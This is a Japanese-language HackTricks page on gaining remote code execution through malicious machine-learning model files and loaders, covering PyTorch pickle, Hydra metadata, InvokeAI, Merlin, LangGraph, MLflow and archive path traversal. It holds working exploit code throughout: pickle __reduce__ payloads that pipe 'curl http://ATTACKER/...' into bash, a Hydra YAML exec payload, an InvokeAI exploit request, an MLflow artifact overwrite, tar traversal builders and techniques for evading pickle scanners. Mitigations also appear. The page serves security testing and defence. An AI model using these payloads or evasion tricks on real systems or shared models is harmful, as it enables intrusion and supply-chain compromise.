# Models RCE

{{#include ../banners/hacktricks-training.md}}

## モデルをロードしてRCE

Machine Learningモデルは、ONNX、TensorFlow、PyTorchなど、さまざまな形式で共有されます。これらのモデルは、開発者のマシンや本番システムにロードして使用できます。通常、モデルに悪意のあるコードが含まれるべきではありませんが、意図された機能として、またはモデルのロードライブラリの脆弱性によって、モデルを使ってシステム上で任意のコードを実行できる場合があります。

以下の表に、このカテゴリにおける代表的な脆弱性を示します。

| **Framework / Tool**        | **脆弱性（該当する場合はCVE）**                                                    | **RCEの経路**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load`における安全でないデシリアライズ* **(CVE-2025-32434)**                                                              | モデルのチェックポイントに含まれる悪意のあるpickleによってコードが実行される（`weights_only`による保護を回避）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 悪意のあるモデルのダウンロードによってコードが実行される。Management APIにおけるJavaデシリアライズRCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load`による安全でないチェックポイントのデシリアライズ **(CVE-2025-23298)**                                           | 信頼できないチェックポイントが`load_model_trainer_states_from_checkpoint`内でpickleのreducerを実行し、ML workerでコードが実行される            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + 安全でないMessagePack拡張hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | ユーザーが制御する`filter`キーにSQL/JSON-path構文を注入し、`UNION SELECT`で偽のチェックポイント行を生成。その後、`msgpack`のデシリアライズによって攻撃者が選んだPythonコードをimportして呼び出す | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678**（安全でないYAML） <br> **CVE-2024-3660**（Keras Lambda）                                                      | YAMLからモデルをロードすると`yaml.unsafe_load`が使われる（コード実行） <br> **Lambda**レイヤーを含むモデルをロードすると任意のPythonコードが実行される          | |
| TensorFlow (TFLite)         | **CVE-2022-23559**（TFLiteのパース処理）                                                                                          | 細工された`.tflite`モデルが整数オーバーフローを引き起こし、heap corruptionにつながる（RCEの可能性）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092**（joblib/pickle）                                                                                           | `joblib.load`でモデルをロードすると、攻撃者の`__reduce__`ペイロードを含むpickleが実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446**（安全でない`np.load`）*異論あり*                                                                              | `numpy.load`はデフォルトでpickle化されたオブジェクト配列を許可しており、悪意のある`.npy/.npz`によってコードが実行される                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882**（ディレクトリトラバーサル） <br> **CVE-2024-5187**（tarトラバーサル）                                                    | ONNXモデルの外部weightパスがディレクトリ外を参照できる（任意ファイルの読み取り） <br> 悪意のあるONNXモデルのtarによって任意のファイルが上書きされる（RCEにつながる） | |
| ONNX Runtime (design risk)  | *CVEなし* ONNXのcustom ops / control flow                                                                                    | custom operatorを含むモデルでは攻撃者のnative codeをロードする必要がある。複雑なモデルグラフがロジックを悪用して、意図しない計算を実行する場合がある   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036**（パストラバーサル）                                                                                          | `--model-control`を有効にした状態でmodel-load APIを使うと、相対パスによるトラバーサルでファイルを書き込める（例：RCEを目的に`.bashrc`を上書き）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668**（複数のheap overflow）                                                                         | 不正なGGUFモデルファイルがparserでheap buffer overflowを引き起こし、被害者のシステム上で任意のコードを実行できる                     | |
| **Keras (older formats)**   | *新しいCVEなし* Legacy Keras H5モデル                                                                                         | Lambdaレイヤーを含む悪意のあるHDF5（`.h5`）モデルは、ロード時にコードを実行する。Kerasのsafe_modeは旧形式を対象としていない（「downgrade attack」） | |
| **Others** (general)        | *設計上の欠陥* – Pickle serialization                                                                                         | 多くのMLツール（例：pickleベースのモデル形式やPythonの`pickle.load`）は、対策されていない限り、モデルファイルに埋め込まれた任意のコードを実行する | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 信頼できないmetadataが`hydra.utils.instantiate()`に渡される **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻撃者が制御するモデルのmetadata/configで`_target_`に任意のcallable（例：`builtins.exec`）を指定でき、たとえ「安全な」形式（`.safetensors`、`.nemo`、repoの`config.json`）でもロード時に実行される | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security)で使われるもののように、`weights_only=True`を指定せずにロードすると、システム上で任意のコードを実行できるPythonのpickleベースのモデルもあります。そのため、上の表に記載されていなくても、pickleベースのモデルはこの種の攻撃に特に脆弱な可能性があります。

### pickleベースのチェックポイントに対する静的チェックの回避

制限のない`pickle.load()`、`joblib.load()`、または`torch.load(..., weights_only=False)`を呼び出すモデルロード処理は、単なるparserではなく、コード実行のsinkです。<sup>[[22]](#references)</sup> PyTorch 2.6では、カスタムpickleモジュールが指定されていない場合、`torch.load()`はデフォルトで`weights_only=True`になります。以下の例を使ってサポートされていないオブジェクトをロードするには、制限のないloader、またはこの保護を無効にしたアプリケーションが必要です。<sup>[[4]](#references)</sup> 静的スキャンで問題が見つからなくても、この境界は変わりません。<sup>[[21]](#references)</sup>

基本的な`__reduce__`プリミティブについては[Python pickle deserialization](../pentesting-web/deserialization/#pickle)、実行時のimportチェックについては[Fickling's ML import allowlist](../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling)を参照してください。

#### callableを登録してから、`EXT2`で解決する

pickleは`REDUCE`を介して`copyreg.add_extension`を呼び出し、攻撃者が選んだ数値のextension codeにmodule/nameの組み合わせを登録できます。その後の`EXT2`でそのコードをcallableに解決し、さらに別の`REDUCE`で呼び出せます。したがって、重要なcallableは`GLOBAL`や`STACK_GLOBAL` opcodeのオペランドではありません。Binarlyは`multiprocessing.util.spawnv_passfds`を使ってこれを実証しました。評価対象のscanner 5つのうち4つが検出できませんでしたが、SaferPickleは検出しました。registryの変更と`EXT2`による解決は、同じunpickling処理の中で発生します。<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

これは opcode のスケッチであり、完全な checkpoint ではありません。外側の loader は、周囲の pickle stream を受け入れる必要があります。危険な callable を探すために `GLOBAL` のオペランドだけを検索する scanner では、その後の lookup を見逃します。`EXT2` に対応していない scanner は、判定を出す前に失敗する可能性があります。厳格な allowlist では、`copyreg.add_extension` 自体が拒否されることもあります。<sup>[[21]](#references)</sup>

#### 構築した code object 型を通常の関数の背後に隠す

別の pickle chain では、`type(copy.copy)` から `FunctionType` を、`type(copy.copy.__code__)` から `CodeType` を取得し、与えられた bytecode から code object を構築して関数としてラップし、呼び出すことができます。公開された variant は `operator.methodcaller('__getattribute__', '__code__')` を通じて `__code__` を取得するため、pickle 内でどちらの constructor も名前で import する必要はありません。`CodeType(...)` のフィールド構成と bytecode は CPython のバージョンに依存するため、異なる interpreter 向けに作られた payload は実行前に失敗する可能性があります。SaferPickle は実証されたサンプルに依然としてフラグを立てましたが、判定を `suspicious` に引き下げました。評価対象となった他の 4 つの scanner は見逃しました。<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### pickle 引数から 2 つ目のモデル読み込みをトリガーする

外側の pickle は、攻撃者が用意したシリアライズ済みモデルを引数として、`torch.storage._load_from_bytes` を呼び出せます。この関数は `torch.load(io.BytesIO(b), weights_only=False)` を呼び出すため、トップレベルの opcode スキャナーには 1 つの callable に渡される bytes として見えていても、ネストされたモデルは weights-only の制限なしにデシリアライズされます。ただし、外側の pickle の読み込みでも、その callable が許可されている必要があります。`weights_only=True` にしても、外側の pickle が自動的にその callable を受け入れるわけではありません。ネストされた bytes を再帰的に調べないスキャナーは、内側の `GLOBAL`/`REDUCE` チェーンを見逃す可能性があります。<sup>[[21]](#references)[[23]](#references)</sup>

#### 読み込み時にレガシー pickle モジュール名を解決する

pickle protocol が 3 未満の場合、Python のデフォルト設定 `fix_imports=True` により、`GLOBAL` 参照の `commands.run` は `_compat_pickle.IMPORT_MAPPING` を介して `subprocess.run` にマッピングされます。リテラルのモジュール文字列を `subprocess` の denylist と照合するスキャナーは、実行時の callable を見逃す可能性があります。この手法には、互換性マッピングを維持し、結果として得られる呼び出し引数を受け入れるローダーが必要です。<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### ZIP 以外の checkpoint を ZIP 専用スキャナーに通す

形式の判定は opcode の検査とは別に失敗することがあります。Binarly の報告によると、ModelScan 0.8.8 は `.bin`、`.pt`、`.pth`、`.ckpt` ファイルを ZIP 専用の PyTorch スキャナーに振り分け、非 ZIP の pickle ストリームを通常の pickle スキャナーにフォールバックさせずにスキップしていました。また、`torch.load()` が受け入れるものの、ModelScan と JFrog が検査していなかったレガシーな TAR モデルのレイアウトも記載されています。これらはスキャナーのバージョン固有の欠陥であり、すべてのモデルスキャナーに当てはまる性質ではありません。<sup>[[21]](#references)</sup>

#### 静的パーサーが不正な末尾に到達する前に実行する

`pickletools.genops()` で pickle 全体を走査するスキャナーは、有効な `REDUCE` の後に切り詰められた opcode があると例外を発生させることがあります。制限のない unpickler は、その末尾に到達する前に callable をすでに呼び出しており、最終的に読み込み全体が例外になった場合でも同様です。報告されたサンプルでは、実行する `REDUCE` の直後に切り詰められた `BINUNICODE` を配置していたため、先行するファイル書き込みの副作用が発生した後に `pickletools.genops()` が失敗しました。この手法でスキャナーを回避できるのは、スキャナーが解析エラーを問題なしとして扱うか、ファイルをスキップする場合に限られます。正常に返されたモデルがなくても副作用が重要となる場合にのみ有効です。読み込みの完了を必要とするターゲットは、このアーティファクトを拒否する可能性があります。<sup>[[21]](#references)</sup>

### Hydra metadata → RCE（safetensors でも有効）

`hydra.utils.instantiate()` は、設定/metadata オブジェクト内のドット付き `_target_` をインポートして呼び出します。Hugging Face Transformers などのライブラリが**信頼できないモデル metadata**を `instantiate()` に渡す場合、攻撃者はモデルの読み込み中に即座に実行される callable と引数を指定できます（pickle は不要です）。<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

payload の例（`.nemo` の `model_config.yaml`、repo の `config.json`、または `.safetensors` 内の `__metadata__` で動作）:

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

主なポイント:
- NeMo の `restore_from/from_pretrained`、uni2TS HuggingFace coders、FlexTok loaders で、モデルの初期化前に実行される。
- Hydra の文字列 block-list は、別の import path（例: `enum.bltns.eval`）や、アプリケーションによって解決される名前（例: `nemo.core.classes.common.os.system` → `posix`）を使って回避できる。<sup>[[14]](#references)</sup>
- FlexTok は `ast.literal_eval` で文字列化された metadata も解析するため、Hydra の呼び出し前に DoS（CPU/メモリの大量消費）が発生する可能性がある。

### 🆕  `torch.load` 経由の InvokeAI RCE（CVE-2024-12029）

`InvokeAI` は、Stable-Diffusion 用の人気のあるオープンソース Web インターフェースです。バージョン **5.3.1 – 5.4.2** では、ユーザーが任意の URL からモデルをダウンロードして読み込める REST endpoint `/api/v2/models/install` が公開されています。<sup>[[1]](#references)</sup>

内部では、この endpoint は最終的に次を呼び出します。

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

指定されたファイルが **PyTorch checkpoint (`*.ckpt`)** の場合、`torch.load` は **pickle deserialization** を実行します。コンテンツはユーザーが制御するURLから直接取得されるため、攻撃者はcheckpoint内にカスタム `__reduce__` メソッドを持つ悪意のあるオブジェクトを埋め込めます。このメソッドは **deserialization中に実行** され、InvokeAIサーバー上で **remote code execution (RCE)** が発生します。

この脆弱性には **CVE-2024-12029** が割り当てられています（CVSS 9.8、EPSS 61.17 %）。

#### 悪用手順

1. 悪意のあるcheckpointを作成します。

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` を自分が管理する HTTP サーバー上でホストします（例: `http://ATTACKER/payload.ckpt`）。
3. 脆弱なエンドポイントをトリガーします（認証不要）：

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI がファイルをダウンロードすると、`torch.load()` を呼び出し、`os.system` gadget が実行され、攻撃者は InvokeAI プロセスのコンテキストでコード実行を獲得します。

既成の exploit: **Metasploit** モジュール `exploit/linux/http/invokeai_rce_cve_2024_12029` が一連の処理を自動化します。<sup>[[3]](#references)</sup>

#### 条件

•  InvokeAI 5.3.1-5.4.2（scan フラグのデフォルトは **false**）
•  `/api/v2/models/install` に攻撃者がアクセスできる
•  プロセスに shell コマンドを実行する権限がある

#### 緩和策

* **InvokeAI ≥ 5.4.3** にアップグレードする。パッチによりデフォルトで `scan=True` が設定され、デシリアライズ前にマルウェアスキャンが実行されます。<sup>[[2]](#references)</sup>
* プログラムから checkpoint を読み込む場合は、`torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper を使用してください。
* model のソースと署名に allow-list を適用し、最小権限でサービスを実行してください。

> ⚠️ 信頼できないソースからデシリアライズする場合、（多くの `.pt`、`.pkl`、`.ckpt`、`.pth` ファイルを含む）Python pickle ベースの形式は**すべて**本質的に危険であることを忘れないでください。

---

古い InvokeAI バージョンを reverse proxy の背後で稼働させ続ける必要がある場合の、場当たり的な緩和策の例:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec における unsafe `torch.load` を介した RCE (CVE-2025-23298)

NVIDIA の Transformers4Rec (Merlin の一部) では、安全でない checkpoint loader が公開されており、ユーザー指定のパスに対して直接 `torch.load()` を呼び出していました。`torch.load` は Python の `pickle` に依存しているため、攻撃者が用意した checkpoint は、デシリアライズ中に reducer を通じて任意のコードを実行できます。<sup>[[5]](#references)</sup>

脆弱なパス (修正前): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

これが RCE につながる理由: Python の pickle では、オブジェクトに callable と引数を返す reducer (`__reduce__`/`__setstate__`) を定義できます。unpickling 中に、その callable が実行されます。このようなオブジェクトが checkpoint に含まれていると、重みが使われる前に実行されます。

最小限の悪意ある checkpoint の例:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

配布ベクトルと影響範囲:
- リポジトリ、バケット、アーティファクトレジストリを通じて共有されるトロイの木馬化されたチェックポイント/モデル
- チェックポイントを自動で読み込む自動再開/デプロイパイプライン
- 実行はトレーニング/推論ワーカー内で行われ、多くの場合、高い権限（例: コンテナ内のroot）で実行される

修正: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) では、直接の `torch.load()` を、`transformers4rec/utils/serialization.py` に実装された制限付きの許可リスト方式のデシリアライザーに置き換えました。新しいローダーは型/フィールドを検証し、ロード中に任意のcallableが呼び出されるのを防ぎます。<sup>[[7]](#references)</sup>

PyTorchチェックポイントに特化した防御ガイダンス:
- 信頼できないデータをunpickleしないでください。可能な場合は、[Safetensors](https://huggingface.co/docs/safetensors/index)やONNXなど、実行可能コードを含まない形式を優先してください。
- PyTorchのシリアライズを使う必要がある場合は、`weights_only=True`（新しいPyTorchでサポート）を指定するか、Transformers4Recのパッチと同様の、カスタムの許可リスト方式のunpicklerを使用してください。<sup>[[4]](#references)</sup>
- モデルの来歴/署名を検証し、デシリアライズをsandboxで実行してください（seccomp/AppArmor、非rootユーザー、ファイルシステムへのアクセス制限、ネットワークへの送信禁止）。
- チェックポイントのロード時に、MLサービスから予期しない子プロセスが生成されていないか監視し、`torch.load()`/`pickle`の使用状況を追跡してください。

POCと脆弱なバージョン/パッチの参照:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- パッチ適用前の脆弱なローダー: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- 悪意のあるチェックポイントのPOC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- パッチ適用後のローダー: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## 例 – 悪意のあるPyTorchモデルの作成

- モデルを作成する:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- モデルを読み込む：

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Tencent FaceDetection-DSFD resnet のデシリアライズ（CVE-2025-13715 / ZDI-25-1183）

Tencent の FaceDetection-DSFD は、ユーザーが制御するデータをデシリアライズする `resnet` endpoint を公開しています。ZDI は、リモート攻撃者が被害者に悪意のあるページ／ファイルを読み込ませ、細工したシリアライズ済み blob をその endpoint に送信させることで、`root` としてデシリアライズを実行し、システムを完全に侵害できることを確認しました。

この exploit の流れは、典型的な pickle の悪用と同様です:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

デシリアライズ中に到達可能な gadget（コンストラクター、`__setstate__`、フレームワークのコールバックなど）は、トランスポートが HTTP、WebSocket、または監視対象ディレクトリに置かれたファイルのいずれであっても、同じ方法で weaponize できます。



### LangGraph checkpointer SQLi → MessagePack RCE

この攻撃チェーンが興味深いのは、攻撃者が**悪意のあるモデルファイルをアップロードする必要がない**点です。代わりに、アプリケーションが**AIエージェントの永続化API**（`get_state_history(..., filter=...)`）を公開しており、ユーザー入力が checkpointer のクエリビルダーに到達します。

#### 1. メタデータフィルターにおける構造的SQLi

脆弱な SQLite のパターンは次のようなものでした。

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

値は後でバインドされますが、`query_key` は **JSON path string** に連結されるため、dictionary key 内の `'` によって `'$.{query_key}'` から抜け出し、SQL を injection できます。同じ教訓は **JSON paths、identifiers、operators、`LIMIT`、TTL fields** にも当てはまります。placeholders が保護するのは値だけであり、query syntax の構造部分は保護しません。

#### 2. `UNION SELECT` はデータ窃取だけでなく、後続の sink も狙える

この query は `type` とシリアライズされた `checkpoint` bytes を返し、これらは後で次のように扱われます。

```python
self.serde.loads_typed((type, checkpoint))
```

つまり、`WHERE`句のSQLiによって**偽の結果行**を注入できます。

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

後続のコードが選択した列を解析、deserialize、書き込み、または実行する場合は、それらの列をシンクに対応付けます。このケースでは、偽の行によってSQLiが**攻撃者制御のdeserialize**に変わります。

#### 3. 安全でない MessagePack extension hook は code gadget と同等

LangGraphの`msgpack`経路では、ネストされたtupleを展開して次を実行するカスタムextension hookが使われていました。

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

そのため、`("os", "system", "id > /tmp/pwned")` と同等の内容をエンコードした MessagePack extension object は、`os` を import し、`system` を解決してコマンドを実行します。AI framework をレビューする際は、**custom MessagePack/JSON/pickle revivers** に動的 import、reflection、または任意の callable のディスパッチがないか確認してください。

#### 4. agent framework の実践的な監査パターン

次に到達するユーザー制御入力をレビューしてください。
- state history / memory / replay / checkpoint listing API
- SQL または Redis query fragment を生成する structured filter builder
- custom deserializer（`pickle`、`msgpack`、`json` object hook、YAML constructor）
- persistence layer から返された row を信頼する recovery path

この特定の chain は、信頼できないユーザーが `filter` を制御できる場合に、**SQLite** または **Redis** checkpointer を使用する self-hosted LangGraph deployment に影響しました。disclosure で示された修正済みバージョンは `langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+`、および `langgraph-checkpoint 4.0.1+` です。<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact overwrite による pickle RCE

`PythonModel` から作成した MLflow PyFunc は、シリアライズされた object を `python_model.pkl` として保存できます。model metadata では `mlflow.pyfunc.model` を loader として指定しており、MLflow の実装では保存された Python model にこのファイル名を使用します。そのため、artifact store への書き込み権限が、後で model を load する別の application での code execution につながる可能性があります。<sup>[[17]](#references)[[18]](#references)</sup>

有効な chain は、**artifact の書き込み権限 → pickle の置き換え → inference consumer に再 load させる**ことです。`mlflow-artifacts:/...` の proxied root を使用する experiment では、experiment、run、model の artifact path を列挙してください。tracking server は `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` で `GET` および `PUT` を公開しています。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

最小限のreducerは、consumerがartifactをunpickleするとすぐにコマンドを実行できます。`MLmodel`で宣言されているPythonのバージョンを使ってpayloadを生成すると、互換性の問題を避けられます。<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

既存のモデルを**読み込む**操作（予測、スコアリング、デプロイなど）を実行します。先に再トレーニングしないでください。トレーニングによって悪意のある artifact が新しいモデルに置き換えられる可能性があります。アプリケーションエラーが発生しても、exploit が成功していないとは限りません。reducer は使用可能なモデルではなく、コマンドの整数の終了ステータスを返すためです。まず ICMP や HTTP callback など、観測可能な副作用を試し、その後、最終的な payload に置き換えます。<sup>[[20]](#references)</sup>

評価中は、run の作成権限と、別の run に属する artifact の上書き権限を区別してください。認証と run ごとの更新権限を確認し、`python_model.pkl` の予期しない変更を調査して、モデルの provenance と integrity を実行境界の一部として扱ってください。現在の MLflow コードでは `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` の設定もサポートされており、cloudpickle データを読み込む代わりに models-from-code artifact を使うことが推奨されています。<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### 公開されたモデルサーバーと ML インフラ

悪意のあるモデルの読み込みだけが、ML インフラ上でコードを実行する方法ではありません。ジョブ送信 API、コード検証エンドポイント、自社ホスト型 AI サービスによるモデルレジストリからの pull は、モデルファイルがなくてもコード実行につながる可能性があります。[公開された自社ホスト型 AI サービス](AI-Exposed-Self-Hosted-AI-Services.md)を参照してください。

## Models による Path Traversal

[**このブログ記事**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)で説明されているように、さまざまな AI framework で使われるモデル形式のほとんどは、通常 `.zip` などの archive をベースにしています。そのため、これらの形式を悪用して Path Traversal 攻撃を行い、モデルの読み込み先システムから任意のファイルを読み取れる可能性があります。<sup>[[16]](#references)</sup>

たとえば、次のコードを使うと、読み込み時に `/tmp` ディレクトリ内にファイルを作成するモデルを作成できます。

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

または、以下のコードを使うと、ロード時に `/tmp` ディレクトリへの symlink を作成するモデルを作成できます：

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### 詳細解説: Keras .keras のデシリアライゼーションと gadget の探索

.keras の内部構造、Lambda レイヤーの RCE、≤ 3.8 における任意の import の問題、修正後の allowlist 内での gadget 発見に焦点を当てたガイドについては、以下を参照してください:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog –「CVE-2024-12029 – InvokeAI における信頼できないデータのデシリアライゼーション」](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI の修正コミット 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit モジュールのドキュメント](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load のセキュリティに関する考慮事項](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298 NVIDIA Merlin でリモートコード実行を実現](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI のアドバイザリ: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec の修正コミット b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [修正前の脆弱な loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [悪意のある checkpoint の PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [修正後の loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 最新の AI/ML フォーマットとライブラリを使ったリモートコード実行](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate のドキュメント](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra の block-list コミット (RCE に関する警告)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi から RCE へ: LangGraph の Checkpointer を悪用する](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip バグを高価値な AI/ML バウンティへつなげる](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk のアドバイザリと PyFunc の proof of concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow のソース – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact のダウンロードおよびアップロード endpoint](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer の静的スキャナー回避手法の分類](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – MLTracer による悪意のあるモデルの検出](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch storage `_load_from_bytes` の実装](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython pickle `find_class` の互換性マッピング](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython `_compat_pickle` の import マッピング](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
